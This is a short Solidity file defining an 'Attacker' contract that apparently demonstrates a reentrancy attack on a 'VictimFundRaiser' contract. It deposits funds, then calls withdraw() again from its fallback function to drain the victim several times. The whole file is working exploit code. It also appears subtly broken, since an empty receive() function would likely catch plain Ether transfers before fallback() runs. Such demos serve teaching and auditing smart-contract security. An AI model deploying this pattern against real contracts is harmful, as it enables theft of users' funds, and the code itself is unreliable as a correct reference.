// SPDX-License-Identifier:MIT

pragma solidity ^0.8.7;

import "./VictimFundRaiser.sol";

contract Attacker {
    //victim address
    address public fundAddress;
    // number of times to drain funds
    uint public drainTimes = 0;

    event fallbackEvent(string fall);
    event receiveEvent(string receiver);

    constructor(address _fundAddress) {
        fundAddress = _fundAddress;
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    //fund victim first before attack
    function fund() public payable {
        VictimFundRaiser(fundAddress).fund{value: msg.value}();
    }

    function withdraw() external payable {
        VictimFundRaiser(fundAddress).withdraw();
    }

    receive() external payable {}

    // where the hack occurs
    fallback() external payable {
        //run the hack 3 times
        if (drainTimes <= 3) {
            ++drainTimes;
            VictimFundRaiser(fundAddress).withdraw();
        }

        emit fallbackEvent("fallback");
    }
}
